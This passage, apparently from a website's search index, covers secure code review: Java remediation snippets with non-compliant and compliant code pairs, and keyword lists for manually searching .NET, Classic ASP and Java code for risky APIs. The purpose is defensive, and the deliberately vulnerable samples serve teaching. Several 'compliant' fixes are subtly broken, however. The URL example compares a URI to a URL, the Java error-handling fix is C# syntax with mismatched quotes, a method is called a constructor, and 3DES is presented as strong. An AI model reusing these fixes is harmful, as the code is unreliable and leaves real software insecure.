used.</p>"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#care-with-bmp-files","title":"Care with BMP files","text":"<p>BMP image files may contain references to local ICC (International Color Consortium) files. Whilst the contents of ICC files are unlikely to be interesting, the act of attempting to read files may be an issue. Either avoid BMP files or reduce privileges.</p>"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#disable-html-display-in-swing-components","title":"Disable HTML display in Swing components","text":"<p>Many Swing pluggable look-and-feel interpret the text in certain components starting with \\ as HTML. If the text is from an untrusted source, an adversary may craft the HTML such that other components appear to be present or perform inclusion attacks.</p> <p>To disable the HTML render feature, set the \"<code>html.disable</code>\" client property of each component to <code>Boolean.TRUE</code> (no other Boolean true instance will do).</p> <p><code>label.putClientProperty(\"html.disable\", true);</code></p>"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#take-care-interpreting-untrusted-code","title":"Take care interpreting untrusted code","text":"<p>Code can be hidden in a number of places. If the source is not trusted to supply code, then a secure sandbox must be constructed to run it in. Some examples of components or APIs that can potentially execute untrusted code include:</p> <ul> <li>Scripts run through the <code>javax.script</code> scripting API or similar.</li> <li>LiveConnect interfaces with JavaScript running in the browser. The JavaScript running on a web page will not usually have been verified with an object code signing certificate.</li> <li>By default, the Oracle implementation of the XSLT interpreter enables extensions to call Java code. Set the <code>javax.xml.XMLConstants.FEATURE_SECURE_PROCESSING</code> feature to disable it.</li> <li>Long Term Persistence of JavaBeans Components supports execution of Java statements.</li> <li>Java Sound will load code through the <code>javax.sound.midi.MidiSystem.getSoundbank</code> methods.</li> <li>RMI may allow the loading of remote code specified by remote connection. On the Oracle JDK, this is disabled by default but may be enabled or disabled through the  <code>java.rmi.server.useCodebaseOnly</code>  system property.</li> <li>LDAP (RFC 2713) allows the loading of remote code in a server response. On the Oracle JDK, this is disabled by default but may be enabled or disabled through the <code>com.sun.jndi.ldap.object.trustURLCodebase</code> system property.</li> <li>Many SQL implementations allow the execution of code with effects outside of the database itself.</li> </ul>"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#prevent-injection-of-exceptional-floating-point-values","title":"Prevent injection of exceptional floating-point values","text":"<p>Working with floating-point numbers requires care when importing those from outside of a trust boundary, as the NaN (not a number) or infinite values can be injected into applications via untrusted input data, for example by conversion of (untrusted) Strings converted by the Double.valueOf method. Unfortunately, the processing of exceptional values is typically not immediately noticed without introducing sanitization code. Moreover, passing an exceptional value to an operation propagates the exceptional numeric state to the operation result.</p> <p>Both positive and negative infinity values are possible outcomes of a floating-point operation when results become too high or too low to be representable by the memory area that backs a primitive floating-point value. Also, the exceptional value NaN can result from dividing 0.0 by 0.0 or subtracting infinity from infinity.</p> <p>The results of casting propagated exceptional floating-point numbers to short, integer, and long primitive values that need special care, too. This is because an integer conversion of a NaN value will result in a 0, and a positive infinite value is transformed to <code>Integer.MAX_VALUE</code>(or <code>Integer.MIN_VALUE</code> for negative infinity), which may not be correct in certain use cases.</p> <p>There are distinct application scenarios where these exceptional values are expected, such as scientific data analysis which relies on numeric processing. However, it is advised that the result values be contained for that purpose in the local component. This can be achieved by sanitizing any floating-point results before passing them back to the generic parts of an application.</p> <p>As mentioned before, the programmer may wish to include sanitization code for these exceptional values when working with floating-point numbers, especially if related to authorization or authentication decisions or forwarding floating-point values to JNI. The <code>Double</code> and <code>Float</code> classes help with sanitization by providing the <code>isNan</code> and <code>isInfinite</code> methods. Also, keep in mind that comparing instances of <code>Double</code>. <code>NaN</code> via the equality operator always results to be false, which may cause lookup problems in maps or collections when using the equality operator on a wrapped double field within the equals method in a class definition.</p> <p>A typical code pattern that can block further processing of unexpected floating-point numbers is shown in the following example snippet.</p> <pre><code>if (Double.isNaN(untrusted_double_value)) {\n // specific action for non-number case\n }\n if (Double.isInfinite(untrusted_double_value)){\n // specific action for infinite case\n }\n // normal processing starts here\n</code></pre> <p>Risk Assessment</p> <p>Injection flaws occur when user-supplied data is sent to an interpreter as part of a command or a particular query. Attackers trick the interpreter into executing unintended commands via supplying specially crafted data. Injection flaws allow attackers to create, read, update, or delete any arbitrary data available to the application. In the worst-case scenario, these flaws allow an attacker to completely compromise the application and the underlying systems, even bypassing deeply nested firewalled environments.</p> <p>The purpose of the command injection attack is to inject and execute commands specified by the attacker in the vulnerable application. In a situation like this, the application, which executes unwanted system commands, is like a pseudo system shell, and the attacker may use it as any authorized system user.</p> <p>Failing to validate XML user input may result in information disclosure and in certain cases, provides the ability to falsify the business logic.</p> Risk Level: High"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#cross-site-request-forgery","title":"Cross-Site Request Forgery","text":"<p>A CSRF attack forces a logged-on victim\u2019s browser to send a request to a vulnerable web application, which then performs the chosen action on behalf of the victim. Any application that accepts HTTP requests from an authenticated user without having some control to verify that the HTTP request is unique to the user\u2019s session. Nearly all web applications!! is vulnerable to CSRF attacks. A session ID is not in scope here as the rogue HTTP request shall also contain a valid session ID as the user is authenticated already.</p> <ul> <li>A unique id is generated upon a login. The unique Id could be derived from a secure random generator such as Secure Random for J2EE. The unique id is stored in a unique random named attribute, which is also generated at runtime. This key-value pair will be stored in the user\u2019s session.</li> <li>The attribute name of this unique id is stored in an attribute called SessionState. The SessionState attribute will be stored in the user\u2019s session.</li> <li>A unique Id is appended to each link/form on the requested page prior to being displayed to the user. Usually, it will be stored as one of the hidden parameters.</li> <li>Upon every request the application checks if the unique Id passed with the HTTP request is valid for a given request by validating against the user\u2019s session.</li> <li>If the unique ID is not present terminate the user session, display an error to the user.</li> </ul> <p>Risk Assessment</p> <p>CSRF vulnerability is very widespread across web applications. For critical applications or transactions, this flaw should be taken care of by providing an extra level of confirmation or password.</p> Risk Level: Medium"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#do-not-use-url-class","title":"Do-not Use URL Class","text":"<p>The concept of virtual hosting allows a web server to host multiple websites on the same computer, sometimes sharing the same IP address. Unfortunately, when the URL class was designed, this technique was unperceived. As a result, two completely different URLs that resolve to the same IP address always compare equally. Also, the URI class also performs normalization of the URL which would eliminate any directory attacks.</p> <p>Non Complaint Solution:</p> <pre><code>import java.net.*;\npublic class Filter {\n public static void canIAllow(String website) throws MalformedURLException {\n final URL allowed = new URL(\"http://Spire.com\");\n if(allowed.equals(new URL(website))) {\n System.out.println(\"URL OK, proceed!\");\n }else {\n System.out.println(\"URL blocked\");\n }\n }\n}\n</code></pre> <p>Compliant Code:</p> <pre><code>import java.net.*;\npublic class Filter {\n public static void canIAllow(String website) throws MalformedURLException {\n final URI allowed = new URI(\"http://Spire.com\");\n if(allowed.equals(new URL(website))) {\n System.out.println(\"URL OK, proceed!\");\n }else {\n System.out.println(\"URL blocked\");\n }\n }\n}\n</code></pre> <p>Risk Assessment</p> <p>Allowing a URL without checking the validity and access will allow an attacker to exploit it.</p> Risk Level: Medium"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#conflict-in-atomicity","title":"Conflict in Atomicity","text":"<p>Do not escalate a privilege and perform an action without knowing the caller\u2019s permissions.</p> <p>The static method doPrivileged() is used to affirm that the invoking method is taking responsibility for exercising its own permissions and that the access permissions of its callers should be ignored. For example, an application may have permissions to operate on a sensitive file; however, a caller of this application may be allowed to operate with only basic user permissions. Invoking doPrivileged() in the context of this method allows it to exercise its own (possibly elevated) permissions under such circumstances.</p> <p>Non-Complaint Code:</p> <pre><code>public static FileInputStream openPasswordFile(String password_file) throws FileNotFoundException {\n //Declare as final and assign before the body of the anonymous inner class\n //Array f[] is used to maintain language semantics while using final\n final FileInputStream f[]={null};\n final String file = password_file;\n //Use own privilege to open the sensitive password file\n AccessController.doPrivileged(new PrivilegedAction() {\n public Object run() {\n try {\n f[0] = new FileInputStream(\"c:\\\\\" + file); //Perform privileged action\n }catch(FileNotFoundException cnf) { System.err.println(cnf.getMessage()); }\n return null; //Still mandatory to return from run()\n }\n }\n return f[0]; //Returns a reference to privileged objects (inappropriate)\n }\n</code></pre> <p>The file is opened in a special privileged mode and the file pointer is returned. This is dangerous and the person who gets this reference can accomplish any privileged task.</p> <p>Compliant Code:</p> <p>Now the new code is changed to perform an action rather than returning a reference of the file. Now the privileged action takes place inside the function call and the lifetime of any critical resource used is encapsulated inside the class. Now nobody could call openpasswordfile() rather they will call the changePassword(). This will make sure, the untrusted applications cannot call</p> <pre><code>public static void changePassword() {\n //Use own privilege to open the sensitive password file\n final String password_file = \"password\";\n final FileInputStream f[] = {null};\n AccessController.doPrivileged(new PrivilegedAction() {\n public Object run() {\n try {\n f[0] = openPasswordFile(password_file); //call the privileged method here\n }catch(FileNotFoundException cnf) { System.err.println(\"Error: Operation could not be performed\"); }\n return null;\n }\n });\n //Perform other operations such as password verification\n }\n private static FileInputStream openPasswordFile(String password_file) throws FileNotFoundException {\n FileInputStream f = new FileInputStream(\"c:\\\\\" + password_file);\n //Perform read/write operations on password file\n return f;\n }\n</code></pre> <p>Risk Assessment</p> <p>Elevating a privilege or returning a reference should be controlled within the scope of the object or package. If left uncontrolled, they can potentially endanger the system and provide a valid platform for the attackers to exploit the machine.</p> Risk Level: High <p>Restrict Accessibility</p> <p>Classes and class members (classes, interfaces, fields, and methods) are subject to access control. The access is indicated by an access modifier: public, protected, private, or the absence of an access modifier (the default access). A simplified view of the access control rules is summarized in the following table. An 'x' conveys that the particular access is permitted from within that domain.</p> Access Specifier Class Package Sub-Class World Private x None x X Protected x X x Public x X x x <p>Non-Complaint Code:</p> <pre><code>public class PublicClass {\n public int x;\n public int y;\n public void getPoint() {\n System.out.println(\"(\" + x + \",\" + y + \")\");\n }\n}\n</code></pre> <p>Compliant Code:</p> <pre><code>final class PrivateClass {\n private int x;\n private int y;\n private void getPoint() { //private constructor\n System.out.println(\"(\" + x + \",\" + y + \")\");\n }\n}\n</code></pre> APIs that should be used with care/to be avoided <code>java.lang.Class.newInstance</code> <code>java.lang.reflect.Constructor.newInstance</code> <code>java.lang.reflect.Field.get*</code> <code>java.lang.reflect.Field.set*</code> <code>java.lang.reflect.Method.invoke</code> <code>java.util.concurrent.atomic.AtomicIntegerFieldUpdater.newUpdater</code> <code>java.util.concurrent.atomic.AtomicLongFieldUpdater.newUpdater</code> <code>java.util.concurrent.atomic.AtomicReferenceFieldUpdater.newUpdater</code> <p>Risk Assessment</p> <p>Performing access checks against the immediate caller, instead of against each caller in the execution sequence, may seriously compromise the security of a java application.</p> Risk Level: Medium"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#limit-the-extensibility-of-the-classes-and-methods","title":"Limit the extensibility of the classes and methods","text":"<p>A nonfinal class or method that is not meant to be inherited can be overridden by an attacker if it is not declared as final. If inheritance is to be limited to trusted implementations for a public, nonfinal class, then the class type should be confirmed before creating the instance at each place where an instance of the nonfinal class can be created. A Security Manager check should be enforced on detecting a subclass.</p> <p>A nonfinal class can be subverted simply by declaring a malicious class that inherits from the nonfinal class, which implies that there is no need for reflection. However, reflection is necessary if the nonfinal class is private or otherwise inaccessible to the attacker.</p> <p>Non-Complaint Code:</p> <pre><code>class BankOperation\n{\n// bank details\n}\n//This class has been written by the attacker\npublic class SubClass extends BankOperation\n{\n public void getBalance() {\n //get the balance and transfer money to attackers account\n }\n}\n</code></pre> <p>Compliant Code:</p> <pre><code>final class BankOperation\n{\n// bank details\n}\n</code></pre> <p>Risk Assessment</p> <p>Allowing a nonfinal class or method to be inherited without checking the class instances allows an attacker to exploit it.</p> Risk Level: High"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#error-handling","title":"Error Handling","text":"<p>Applications frequently generate error messages and display them to users. Many times, these error messages are quite useful to attackers, as they reveal implementation details or information that is useful in exploiting a vulnerability. There are several common examples of this:</p> <p>Detailed error handling, where inducing an error displays too much information, such as stack traces, failed SQL statements, or other debugging information</p> <p>It must be ensured that the end-users receive a generic error message.</p> <p>For e.g. (\u201cError occurred, try again\u201d).</p> <p>Non-Complaint Code:</p> <pre><code>try\n{\n ------------------\n}\ncatch(Exception e)\n{\ne.printStackTrace();\n}\n</code></pre> <p>Compliant Code:</p> <pre><code>try\n{\n ------------------\n}\ncatch(Exception e)\n{\nConsole.WriteLine(\"An error occurred\u201d);\nlogerror(\u201cError: \u201c, e);\n}\nfinally\n{\n if (object ! = null)\n object.close(); //release the resources\n}\n</code></pre> <p>Risk Assessment</p> <p>Detailed error messages help in gathering more information related to the underlying resources used by the application.</p> Risk Level: High"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#audit-log","title":"Audit Log","text":"<p>Applications should always maintain audit logs. These logs have valuable information such as the users, their actions, and workflow. This log can later be used for various purposes like determining the cause of a particular problem, performing an audit, identifying potential fraud or anomalies, and performing forensic analysis.</p> <p>Activities that should be logged in the audit logs.</p> <ul> <li>Login Success or failure with the username</li> <li>Profile changes and what content was changed</li> <li>All transactions with transaction number (critical transactions)</li> <li>Password resets</li> <li>Change of address</li> <li>Changes to the sensitive data.</li> <li>Admin user\u2019s activities must be logged</li> <li>Server-side validation failures</li> <li>All privileged actions</li> </ul> <p>Use the following format for the audit log.</p> <p><code>TIMESTAMP IPADDRESS HOSTNAME APP-NAME MODULENAME PRIORITY SYSTEM-USER APPLICATION-USER MSGID [SD-ID]s MSG</code></p> <p>Risk Assessment</p> <p>Maintaining audit logs helps in tracing back details of a transaction or event at a later point in time.</p> Risk Level: High"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#native-codes","title":"Native Codes","text":"<p>Native methods are defined in Java and written in traditional languages such as C/C++ (see [JNI 06]). The added extensibility comes at the cost of flexibility and portability as the code no longer conforms to the policies enforced by Java.</p> <p>Compliant Code:</p> <p>It is recommended not to use native methods.</p> <p>Risk Assessment</p> <p>Allowing native methods to be called directly by trusted/untrusted code may seriously compromise the security of a Java application.</p> Risk Level: High"},{"location":"Pentesting/Secure%20Code%20Review/remedial-code-snippets/#bytecode-verifier","title":"ByteCode Verifier","text":"<p>The bytecode verifier is an internal component of the JVM and is responsible for detecting non-confirming Java code. It performs tasks such as ensuring that the class file is in the proper format, illegal type casts are not performed and preventing operand stack overflows or underflows.</p> <p>Non-Complaint Code:</p> <pre><code>package creditvault.values;\npublic class CreditCard {\n private String creditcard = \"1234 1201 1234 0001\";\n public getCreditCard()\n {\n Return creditcard\n }\n}\npackage creditvault.values;\npublic class CreditVerify {\n public static void main(String[] args) {\n CreditCard number = new CreditCard ();\n System.out.println(\"Please enter your creditcard no:\");\n //perform verification\n }\n}\n</code></pre> <p>Compliant Code:</p> <pre><code>Java -verify &lt;applilcation&gt; or use -Xverify:all flag\n</code></pre> <p>This is not required on Java 2.0 and above as the bytecode is verified by default.</p> <p>Risk Assessment</p> <p>If the bytecode verifier is not applied to all code, then code could be loaded into a java system that does not conform to the Java Language Specification. This code could bypass checks that are normally expected to be performed by Java code, thereby compromising security.</p> Risk Level: Medium"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-.net/","title":"Securev Code Review in .NET","text":""},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-.net/#securev-code-review-in-net","title":"Securev Code Review in .NET","text":"<p>Firstly, one needs to be familiar with the tools one can use in order to perform text searching, following this one needs to know what to look for.</p> <p>One could scan through the code looking for common patterns or keywords such as \u201cUser\u201d, \u201cPassword\u201d, \u201cPswd\u201d, \u201cKey\u201d, \u201cHttp\u201d, etc... This can be performed using the \u201cFind in Files\u201d tool in VS or using find string as follows: findstr /s /m /i /d:c:\\projects\\codebase\\sec \u201chttp\u201d *.*</p>"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-.net/#http-request-strings","title":"HTTP Request Strings","text":"<p>Requests from external sources are obviously a key area of a security code review. We need to ensure that all HTTP requests received are data validated for composition, max and min length, and if the data falls within the realms of the parameter whitelist. Bottom-line is this is a key area to look at and ensure security is enabled.\\</p> STRING TO SEARCH request.accesstypes request.httpmethod request.cookies request.url request.browser request.querystring request.certificate request.urlreferrer request.files request.item request.rawurl request.useragent request.headers request.form request.servervariables request.userlanguages request.TotalBytes request.BinaryRead"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-.net/#html-output","title":"HTML Output","text":"<p>Here we are looking for responses to the client. Responses which go unvalidated or which echo external input without data validation are key areas to examine. Many client side attacks result from poor response validation.</p> STRING TO SEARCH response.write HttpUtility HtmlEncode UrlEncode innerText innerHTML &lt;%="},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-.net/#sql-database","title":"SQL &amp; Database","text":"<p>Locating where a database may be involved in the code is an important aspect of the code review. Looking at the database code will help determine if the application is vulnerable to SQL injection. One aspect of this is to verify that the code uses either SqlParameter, OleDbParameter, or OdbcParameter(System.Data.SqlClient). These are typed and treat parameters as the literal value and not executable code in the database.</p> STRING TO SEARCH exec sp_ select from insert update delete from where delete execute sp_ exec xp_ exec @ execute @ executestatement executeSQL setfilter executeQuery GetQueryResultInXML adodb sqloledb sql server driver Server.CreateObject .Provider System.Data.sql ADODB.recordset New OleDbConnection ExecuteReader DataSource SqlCommand Microsoft.Jet SqlDataReader ExecuteReader SqlDataAdapter StoredProcedure"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-.net/#cookies","title":"Cookies","text":"<p>Cookie manipulation can be key to various application security exploits, such as session hijacking/fixation and parameter manipulation. One should examine any code relating to cookie functionality, as this would have a bearing on session security.</p> STRING TO SEARCH System.Net.Cookie HTTPOnly document.cookie"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-.net/#machineconfig","title":"machine.config","text":"<p>It is important that many variables in machine.config can be overridden in the web.config file for a particular application.</p> STRING TO SEARCH validateRequest enableViewState enableViewStateMac validateRequest"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-.net/#html-tags","title":"HTML Tags","text":"<p>Many of the HTML tags below can be used for client side attacks such as cross site scripting. It is important to examine the context in which these tags are used and to examine any relevant data validation associated with the display and use of such tags within a web application.</p> STRING TO SEARCH HtmlEncode URLEncode \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\&lt;frame security \\&lt;iframe security"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-.net/#input-controls","title":"Input Controls","text":"<p>The input controls below are server classes used to produce and display web application form fields. Looking for such references helps locate entry points into the application.</p> STRING TO SEARCH htmlcontrols.htmlinputhidden webcontrols.hiddenfield webcontrols.hyperlink webcontrols.textbox webcontrols.label webcontrols.linkbutton webcontrols.listbox webcontrols.checkboxlist webcontrols.dropdownlist"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-.net/#logging","title":"Logging","text":"<p>Logging can be a source of information leakage. It is important to examine all calls to the logging subsystem and to determine if any sensitive information is being logged. Common mistakes are logging userID in conjunction with passwords within the authentication functionality or logging database requests which may contain sensitive data.</p> STRING TO SEARCH log4net Console.WriteLine System.Diagnostics.Debug System.Diagnostics.Trace"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-.net/#webconfig","title":"WEB.config","text":"<p>The .NET Framework relies on .config files to define configuration settings. The .config files are text-based XML files. Many .config files can, and typically do, exist on a single system. Web applications refer to a web.config file located in the application\u2019s root directory. For ASP.NET applications, web.config contains information about most aspects of the application\u2019s operation.</p> STRING TO SEARCH requestEncoding responseEncoding Trace authorization compilation webcontrols.linkbutton webcontrols.listbox webcontrols.checkboxlist webcontrols.dropdownlist CustomErrors httpCookies httpHandlers httpRuntime sessionState maxRequestLength Debug forms protection appSettings ConfigurationSettings appSettings connectionStrings authentication mode Allow Deny Credentials identity impersonate timeout remote"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-.net/#globalasax","title":"global.asax","text":"<p>Each application has its own global.asax file if one is required. Global.asax sets the event code and values for an application using scripts. One must ensure that application variables do not contain sensitive information, as they are accessible to the whole application and to all users within it.</p> STRING TO SEARCH Application_OnAuthenticateRequest Application_OnAuthorizeRequest Session_OnStart Session_OnEnd"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-.net/#class-design","title":"Class Design","text":"<p>Public and Sealed relate to the design at class level. Classes that are not intended to be derived from should be sealed. Make sure all class fields are Public for a reason. Don\u2019t expose anything that is not necessary</p> STRING TO SEARCH Public Sealed"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-.net/#threads-and-concurrency","title":"Threads and Concurrency","text":"<p>Locating code that contains multithreaded functions as concurrency issues can result in race conditions, which may result in security vulnerabilities. The Thread keyword is where new threads objects are created. Code that uses static global variables that hold sensitive security information may cause session issues. Code that uses static constructors may also cause issues between threads. Not synchronizing the Dispose method may cause issues if a number of threads call Dispose at the same time, this may cause resource release issues.</p> STRING TO SEARCH Thread Dispose"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-.net/#reflection-and-serialization","title":"Reflection and Serialization","text":"<p>Code may be generated dynamically at runtime. Code that is generated dynamically as a function of external input may give rise to issues. If code contains sensitive data, does it need to be serialized?</p> STRING TO SEARCH Serializable AllowPartiallyTrustedCallersAttribute GetObjectData System.Reflection StrongNameIdentity StrongNameIdentityPermission"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-.net/#storage","title":"Storage","text":"<p>If storing sensitive data in memory, it is recommended to use the following.</p> STRING TO SEARCH SecureString ProtectedMemory"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-.net/#exceptions-errors","title":"Exceptions &amp; Errors","text":"<p>Ensure that the catch blocks do not leak information to the user in the case of an exception. Ensure when dealing with resources that the finally block is used. Having trace enabled is not great from an information leakage perspective. Ensure customized errors are properly implemented</p> STRING TO SEARCH catch finally trace enabled customErrors mode"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-.net/#cryptography","title":"Cryptography","text":"<p>If cryptography is used then is a strong enough cipher used, i.e. AES or 3DES? What size key is used? The larger the better. Where is hashing performed? Are passwords that are being persisted hashed? They should be. How are random numbers generated? Is the PRNG \u201crandom enough\u201d?</p> STRING TO SEARCH RNGCryptoServiceProvider SHA MD5 base64 DES RC2 System.Random Random xor System.Security.Cryptography"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-.net/#authorization-assert-revert","title":"Authorization, Assert &amp; Revert","text":"<p>Bypassing the .Net code access security permission? Not a good idea. Below is a list of potentially dangerous permissions such as calling unmanaged code, outside the CLR.</p> STRING TO SEARCH RequestMinimum RequestOptional Assert Debug.Assert CodeAccessPermission MemberAccess ControlAppDomain UnmanagedCode SkipVerification ControlEvidence SerializationFormatter ControlPrincipal ControlDomainPolicy ControlPolicy"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-.net/#legacy-methods","title":"Legacy Methods","text":"<p>Some standard functions that should be checked in any context include the following</p> STRING TO SEARCH printf strcpy"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-classic-asp/","title":"Securev Code Review in Classic ASP","text":""},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-classic-asp/#securev-code-review-in-classic-asp","title":"Securev Code Review in Classic ASP","text":""},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-classic-asp/#general-strings","title":"General Strings","text":"<p>Input APIs in ASP are commonly used to retrieve the input from the request, therefore code review should ensure these requests (and dependent logic) cannot be manipulated by an attacker. Output APIs are used by ASP to write the response body that will be sent to the end user, hence code review should check these requests are used in a proper manner and no sensitive information can be returned. Cookies can also be a source of information leakage.</p> STRING TO SEARCH Request Request.QueryString Request.Form Request.ServerVariables Query_String hidden include .inc Response.Write Response.BinaryWrite &lt;%= .cookies"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-classic-asp/#error-handling","title":"Error Handling","text":"<p>Ensure errors in an application are handled properly, otherwise an attacker could use error conditions to manipulate the application.</p> STRING TO SEARCH err. Server.GetLastError On Error Resume Next On Error GoTo 0"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-classic-asp/#information-in-url","title":"Information in URL","text":"<p>These APIs are used to extract information from the URL object in the request. Code review should check that the information extracted from the URL is sanitized.</p> STRING TO SEARCH location.href location.replace method=\u201dGET\u201d On Error GoTo 0"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-classic-asp/#database","title":"Database","text":"<p>These APIs can be used to interact with a database, which can lead to SQL attacks. Code review can check these API calls use sanitized input.</p> STRING TO SEARCH commandText select from update insert into delete from where IRowSet execute .execute .open ADODB. Commandtype ICommand"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-classic-asp/#session","title":"Session","text":"<p>These API calls can control session within ASP applications.</p> STRING TO SEARCH session.timeout session.abandon session.removeall"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-classic-asp/#dos-prevention-logging","title":"DOS Prevention &amp; Logging","text":"<p>The following ASP APIs can help prevent DOS attacks against the application. Leaking information to a log can be of use to an attacker, hence the following API call can be checked in code review to ensure no sensitive information is being written to logs.</p> STRING TO SEARCH server.ScriptTimeout IsClientConnected WriteEntry"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-classic-asp/#redirection","title":"Redirection","text":"<p>Do not allow attacker input to control when and where rejection occurs.</p> STRING TO SEARCH Response.AddHeader Response.AppendHeader Response.Redirect Response.Status Response.StatusCode Server.Transfer Server.Execute"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-java/","title":"Securev Code Review in Java","text":""},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-java/#securev-code-review-in-java","title":"Securev Code Review in Java","text":""},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-java/#input-and-output-streams","title":"Input and Output Streams","text":"<p>These are used to read data into one\u2019s application. They may be potential entry points into an application. The entry points may be from an external source and must be investigated. These may also be used in path traversal attacks or DoS attacks.</p> STRING TO SEARCH FileInputStream ObjectInputStream FilterInputStream PipedInputStream SequenceInputStream StringBufferInputStream BufferedReader ByteArrayInputStream java.io.FileOutputStream File ObjectInputStream PipedInputStream StreamTokenizer getResourceAsStream java.io.FileReader java.io.FileWriter java.io.RandomAccessFile java.io.File renameTo Mkdir"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-java/#cross-site-scripting","title":"Cross Site Scripting","text":"<p>These API calls should be checked in code review as they could be a source of Cross Site Scripting vulnerabilities</p> STRING TO SEARCH javax.servlet.ServletOutputStream.print strcpy"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-java/#response-splitting","title":"Response Splitting","text":"<p>Response splitting allows an attacker to take control of the response body by adding extra CRLFs into headers. In HTTP the headers and bodies are separated by 2 CRLF characters, and thus if an attackers input is used in a response header, and that input contained 2 CRLFs, then anything after the CRLFs would be interpreted as the response body. In code review ensure functionality is sanitizing any information being put into headers.</p> STRING TO SEARCH javax.servlet.http.HttpServletResponse.sendRedirect strcpy setHeader"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-java/#servlets","title":"Servlets","text":"<p>These API calls may be avenues for parameter/header/URL/cookie tampering, HTTP Response Splitting and information leakage. They should be examined closely as many of such APIs obtain the parameters directly from HTTP requests.</p> STRING TO SEARCH javax.servlet.* getParameterNames getParameterValues getParameter getParameterMap getScheme getProtocol getContentType getServerName getRemoteAddr getRemoteHost getRealPath getLocalName getAttribute getAttributeNames getLocalAddr getAuthType getRemoteUser getCookies isSecure HttpServletRequest getQueryString getHeaderNames getHeaders getPrincipal getUserPrincipal isUserInRole getInputStream getOutputStream getWriter addCookie addHeader setHeader setAttribute putValue javax.servlet.http.Cookie getName getPath getDomain getComment getMethod getPath getReader getRealPath getRequestURI getRequestURL getServerName getValue getValueNames getRequestedSessionId"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-java/#redirection","title":"Redirection","text":"<p>Any time an application is sending a redirect response, ensure that the logic involved cannot be manipulated by an attackers input. Especially when input is used to determine where the redirect goes to.</p> STRING TO SEARCH sendRedirect setStatus addHeader etHeader"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-java/#sql-database","title":"SQL &amp; Database","text":"<p>Searching for Java database related code should help pinpoint classes/methods which are involved in the persistence layer of the application being reviewed.</p> STRING TO SEARCH java.sql.Connection.prepareStatement java.sql.ResultSet.getObject select insert java.sql.Statement.executeUpdate java.sql.Statement.addBatch execute executestatement createStatement java.sql.ResultSet.getString executeQuery jdbc java.sql.Statement.executeQuery java.sql.Statement.execute delete update java.sql.Connection.prepareCall"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-java/#ssl","title":"SSL","text":"<p>Looking for code which utilizes SSL as a medium for point to point encryption. The following fragments should indicate where SSL functionality has been developed.</p> STRING TO SEARCH com.sun.net.ssl SSLContext SSLSocketFactory TrustManagerFactory HttpsURLConnection KeyManagerFactory"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-java/#session-management","title":"Session Management","text":"<p>The following APIs should be checked in code review when they control session management.</p> STRING TO SEARCH getSession invalidate getId"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-java/#legacy-interaction","title":"Legacy Interaction","text":"<p>Here we may be vulnerable to command injection attacks or OS injection attacks. Java linking to the native OS can cause serious issues and potentially give rise to total server compromise.</p> STRING TO 